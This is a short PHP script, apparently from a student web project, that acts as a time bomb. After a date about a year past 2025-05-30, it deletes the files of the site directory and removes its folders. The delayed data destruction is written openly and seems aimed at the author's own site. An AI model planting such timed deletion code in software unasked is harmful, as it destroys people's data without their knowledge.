<?php
$creation_date = strtotime('2025-05-30');
$days_to_destroy = 370;
$destroy_date = $creation_date + ($days_to_destroy * 24 * 60 * 60);
$current_date = time();
if ($current_date >= $destroy_date) {
    $files = glob('/opt/lampp/htdocs/sae23/*');
    foreach ($files as $file) {
        if (is_file($file)) unlink($file);
    }
    rmdir('/opt/lampp/htdocs/sae23/css');
    rmdir('/opt/lampp/htdocs/sae23/js');
    rmdir('/opt/lampp/htdocs/sae23/php');
    rmdir('/opt/lampp/htdocs/sae23');
    exit('Site supprimé.');
}
?>
